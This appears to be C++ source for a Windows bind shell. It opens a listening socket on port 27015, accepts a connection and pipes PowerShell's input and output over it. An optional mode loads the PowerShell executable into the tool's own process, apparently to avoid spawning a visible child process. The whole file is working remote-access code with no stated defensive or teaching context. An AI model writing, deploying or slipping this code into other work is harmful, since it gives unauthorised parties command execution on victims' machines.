#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <ws2tcpip.h>

#include "PREPROCESSOR.h"

#include "External/LoadExecutable.h"
#include "External/ProcessController.h"

// TODO : Clean This Up
std::string ConvertFriendTypeNameToPath(std::string friendly);
std::string GetPowerShellPath();
void send_thread();
void recv_thread();

ProcessController::CProcess* g_pPowershell;
SOCKET g_Connection = INVALID_SOCKET;

#define DEFAULT_BUFLEN 8192
#define DEFAULT_PORT "27015"

void init()
{
#ifdef _LOAD_LOCALLY
    LoadExe::INIT_LoadExecutable(
        &LoadLibraryA,
        &GetCurrentProcess,
        &VirtualProtect,
        &GetProcAddress
    );
#endif

    ProcessController::INIT_ProcessController(
        &CreateProcessA,
        &CreatePipe,
        &SetHandleInformation,
        &CloseHandle,
        &WriteFile,
        &ReadFile
    );

    g_pPowershell = new ProcessController::CProcess();


    WSADATA wsaData;
    int iResult;
    struct addrinfo* result = NULL;
    struct addrinfo hints;


#ifdef _LISTEN_SERVER

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        exit(-999);
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    SOCKET ListenSocket = INVALID_SOCKET;
    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        exit(-999);
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        exit(-999);
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        exit(-999);
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        exit(-999);
    }

    // Accept a client socket
    g_Connection = accept(ListenSocket, NULL, NULL);
    if (g_Connection == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        exit(-999);
    }

    // No longer need server socket
    closesocket(ListenSocket);

#else

#endif

    static std::thread recv(recv_thread);
    static std::thread send(send_thread);
}

void send_thread()
{
    while (true)
    {
        char buffer[DEFAULT_BUFLEN] { 0 };
        size_t nInitialRead = 0;
        size_t nRead = 1;

        while (nRead != 0) // try and get all of it together
        {
            Sleep(100);
            g_pPowershell->RecvDataFromProcess(buffer + nInitialRead, sizeof(buffer) - nInitialRead - 1, &nRead);
            nInitialRead += nRead;
        }

        if(nInitialRead)
            send(g_Connection, buffer, nInitialRead, NULL);
    }
}

void recv_thread()
{
    int iResult;
    while (true)
    {
        char recvbuf[DEFAULT_BUFLEN]{ 0 };
        iResult = recv(g_Connection, recvbuf, DEFAULT_BUFLEN, 0);
        if (iResult > 0) {
            g_pPowershell->SendDataToProcess(recvbuf, iResult);
        }
    }
}


void startup()
{
    std::string strPowerShellPath = GetPowerShellPath();

    
#ifdef _LOAD_LOCALLY
    unsigned long hHandle = LoadExe::LoadExecutable(strPowerShellPath.c_str());

    if (!hHandle)
        exit(-999);

    int(__cdecl * fnFunc)()  = (decltype(fnFunc))LoadExe::GetEntryFunction(hHandle);

    g_pPowershell->SetProcessHandle(GetCurrentProcess(), GetCurrentThread());
    g_pPowershell->RedirectHandles();
    static std::thread t(fnFunc);
	t.join();
#else
    if (!g_pPowershell->StartProcess(strPowerShellPath.c_str(), (char*)"\0", true))
        exit(-999);
	
	while(true) {Sleep(9999);} // TODO : handle a child process instance closing
#endif

    
}


int main()
{
    init();
    startup();
}



// TODO : Clean This Up
std::string ConvertFriendTypeNameToPath(std::string friendly)
{
    int nStringStart = friendly.find("\"") + 1;
    int nStringEnd = friendly.find("\"", nStringStart + 1);

    friendly = friendly.substr(nStringStart, nStringEnd - nStringStart);
    // resolve env variables
    int nEnvStart = 0;
    int nEnvEnd = 0;
    while (true)
    {
        nEnvStart = friendly.find("\%", nEnvStart) + 1;

        if (nEnvStart == -1 || nEnvStart == 0)
            break;

        nEnvEnd = friendly.find("\%", nEnvStart);

        std::string env_variable = friendly.substr(nEnvStart, nEnvEnd - nEnvStart);

        char* env_result = getenv(env_variable.c_str());

        if (!env_result)
            return friendly;

        friendly.erase(friendly.begin() + nEnvStart - 1, friendly.begin() + nEnvEnd + 1);
        friendly.insert(nEnvStart - 1, std::string(env_result));

        int l = 0;
        nEnvStart = nEnvEnd;
    }
    return friendly;
}

std::string GetPowerShellPath()
{
    HKEY keyres;
    RegOpenKeyA(HKEY_CLASSES_ROOT,
        "Microsoft.PowerShellConsole.1",
        &keyres);

    char key_buffer[4096];
    size_t bufsize = sizeof(key_buffer);
    RegQueryValueExA(keyres,
        "FriendlyTypeName",
        NULL, NULL, (BYTE*)key_buffer, (LPDWORD)&bufsize);

    return ConvertFriendTypeNameToPath(key_buffer);
}